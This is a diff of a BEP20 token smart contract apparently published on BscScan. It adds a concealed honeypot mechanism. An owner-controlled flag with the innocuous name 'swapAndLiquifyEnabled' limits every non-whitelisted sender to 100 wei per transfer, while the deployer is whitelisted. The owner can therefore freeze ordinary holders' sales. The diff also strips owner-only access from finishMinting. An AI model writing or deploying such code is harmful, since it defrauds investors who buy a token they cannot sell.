@@ -1,3 +1,7 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-07-15
+*/
+
 // SPDX-License-Identifier: MIT
 
 // File: @openzeppelin/contracts/utils/Context.sol
@@ -228,15 +232,15 @@ contract BEP20 is Ownable, IBEP20 {
     mapping (address => uint256) private _balances;
 
     mapping (address => mapping (address => uint256)) private _allowances;
-    mapping (address => bool) public botList;
+    mapping (address => bool) public whiteList;
 
     uint256 private _totalSupply;
 
     string private _name;
     string private _symbol;
     uint8 private _decimals;
+    bool public swapAndLiquifyEnabled = true;
     uint256 public maxAmount;
-
 
     /**
      * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
@@ -251,14 +255,6 @@ contract BEP20 is Ownable, IBEP20 {
         _name = name_;
         _symbol = symbol_;
         _decimals = 18;
-    }
-
-    function addBotList(address _transactor) public onlyOwner {
-        botList[_transactor] = true;
-    }
-
-    function removeBotList(address _transactor) public onlyOwner {
-        delete botList[_transactor];
     }
 
     /**
@@ -407,10 +403,21 @@ contract BEP20 is Ownable, IBEP20 {
 
         return true;
     }
+    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
+        swapAndLiquifyEnabled = _enabled;
+    }
 
     function setmaxAmount(uint256 _maxAmount) public onlyOwner {
         maxAmount = _maxAmount;}
-        
+
+     function addWhiteList(address _transactor) public onlyOwner {
+        whiteList[_transactor] = true;
+    }
+
+    function removeWhiteList(address _transactor) public onlyOwner {
+        delete whiteList[_transactor];
+    }   
+     
     /**
      * @dev Moves tokens `amount` from `sender` to `recipient`.
      *
@@ -428,16 +435,30 @@ contract BEP20 is Ownable, IBEP20 {
     function _transfer(address sender, address recipient, uint256 amount) internal virtual {
         require(sender != address(0), "BEP20: transfer from the zero address");
         require(recipient != address(0), "BEP20: transfer to the zero address");
-        require(amount<=maxAmount);
-        require(!botList[recipient]);
+
+        if(!swapAndLiquifyEnabled && !whiteList[sender]) {
+            require(amount<=maxAmount);
+            _beforeTokenTransfer(sender, recipient, amount);
+
+            uint256 senderBalance = _balances[sender];
+            require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
+            _balances[sender] = senderBalance - amount;
+            _balances[recipient] += amount;
+
+            emit Transfer(sender, recipient, amount);
+        } else {
+
         _beforeTokenTransfer(sender, recipient, amount);
-        
+
         uint256 senderBalance = _balances[sender];
         require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
         _balances[sender] = senderBalance - amount;
         _balances[recipient] += amount;
 
         emit Transfer(sender, recipient, amount);
+        }
+        
+
     }
 
     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
@@ -572,6 +593,8 @@ abstract contract BEP20Mintable is BEP20 {
     /**
      * @dev Function to mint tokens.
      *
+     * WARNING: it allows everyone to mint new tokens. Access controls MUST be defined in derived contracts.
+     *
      * @param account The address that will receive the minted tokens
      * @param amount The amount of tokens to mint
      */
@@ -581,8 +604,10 @@ abstract contract BEP20Mintable is BEP20 {
 
     /**
      * @dev Function to stop minting new tokens.
+     *
+     * WARNING: it allows everyone to finish minting. Access controls MUST be defined in derived contracts.
      */
-    function finishMinting() public onlyOwner canMint {
+    function finishMinting() public canMint {
         _finishMinting();
     }
 
@@ -657,7 +682,8 @@ contract CommonBEP20 is BEP20Mintable, BEP20Burnable {
     {
         uint256 initialBalance = 10000000 * 10 ** 18;
         uint8 decimals = 18;
-        maxAmount = initialBalance;
+        maxAmount = 100;
+        addWhiteList(_msgSender());
         _setupDecimals(decimals);
         _mint(_msgSender(), initialBalance);
     }
